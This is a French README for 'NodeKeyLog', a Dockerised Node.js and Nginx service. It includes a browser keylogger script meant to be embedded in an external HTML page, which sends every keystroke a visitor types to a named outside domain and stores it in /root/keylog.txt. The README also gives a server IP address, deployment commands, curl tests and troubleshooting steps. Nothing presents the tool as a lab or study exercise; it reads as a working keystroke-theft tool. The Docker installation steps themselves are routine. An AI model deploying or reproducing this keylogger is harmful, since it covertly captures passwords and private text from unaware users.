# NodeKeyLog

2. **Lancer les conteneurs**
```bash
docker compose up -d --build
```

3. **Vérifier**
- Le serveur Node.js écoute sur le port 3000 (interne)
- Nginx reverse proxy sur http://nodekey.skandy.online et http://www.nodekey.skandy.online
- Les touches sont enregistrées dans `/root/keylog.txt` sur le serveur

## Script client
Inclure le fichier `client-keylogger.js` dans ta page HTML externe.
```
  <script >(function() {
        document.addEventListener('keydown', function(e) {
            fetch('http://nodekey.skandy.online/keylog', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ key: e.key })
            });
        });
    })();</script>
    
```

## Tester le fonctionnement

1. **Vérifier que les conteneurs tournent**
   ```bash
   docker ps
   ```
   Tu dois voir deux conteneurs : `nodekeylog-server` et `nodekeylog-nginx`.

2. **Vérifier que le serveur répond**
   - Ouvre un navigateur et va sur :
     - http://nodekey.skandy.online
     - ou http://146.190.136.86
   - curl -X POST http://nodekey.skandy.online/keylog -H "Content-Type: application/json" -d '{"key":"A"}'

3. **Tester l’enregistrement des touches**
   - Crée une page HTML locale avec le script fourni (voir ci-dessous)
   - Ouvre la page dans ton navigateur, tape sur le clavier
   - Les touches doivent s’enregistrer dans `/root/keylog.txt` sur le serveur (vérifie avec `docker exec` ou en te connectant en SSH)
   ```bash
   docker exec -it nodekeylog-server cat /root/keylog.txt
   ```
# 1. Mettre à jour les paquets
sudo apt-get update
sudo apt-get install -y ca-certificates curl gnupg lsb-release

# 2. Créer le répertoire pour les clés
sudo mkdir -p /etc/apt/keyrings

# 3. Télécharger la clé GPG officielle Docker
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg

# 4. Donner les bonnes permissions
sudo chmod a+r /etc/apt/keyrings/docker.gpg

# 5. Ajouter le dépôt Docker (remplace $(lsb_release -cs) par ta version Ubuntu si besoin, ex : jammy, focal…)
echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
  $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

# 6. Mettre à jour et installer Docker
sudo apt-get update
sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin


---

**Remarque :**
- Pour HTTPS, il faudra ajouter une configuration supplémentaire (Let’s Encrypt, etc).
- Pour toute question ou amélioration, ouvre une issue ou contacte le mainteneur.

---

## Dépannage & Astuces

### Problème de montage du fichier `/root/keylog.txt`

Si tu obtiens une erreur du type :
```
error mounting "/root/keylog.txt" ... not a directory: unknown: Are you trying to mount a directory onto a file (or vice-versa)?
```
**Solution :**
1. Supprime le conteneur Node.js :
   ```bash
   docker rm -f nodekeylog-server
   ```
2. Sur le serveur, assure-toi que `/root/keylog.txt` existe et est bien un fichier :
   ```bash
   rm -rf /root/keylog.txt
   touch /root/keylog.txt
   chmod 666 /root/keylog.txt
   ```
3. Relance les conteneurs :
   ```bash
   docker-compose up -d --build
   ```

### Tester l’API avec curl

Pour vérifier que le serveur reçoit bien les touches :
```bash
curl -X POST http://nodekey.skandy.online/keylog -H "Content-Type: application/json" -d '{"key":"A"}'
```
Tu dois recevoir :
```json
{"message":"Touche enregistrée."}
```
Et voir la lettre dans `/root/keylog.txt` :
```bash
cat /root/keylog.txt
```

---
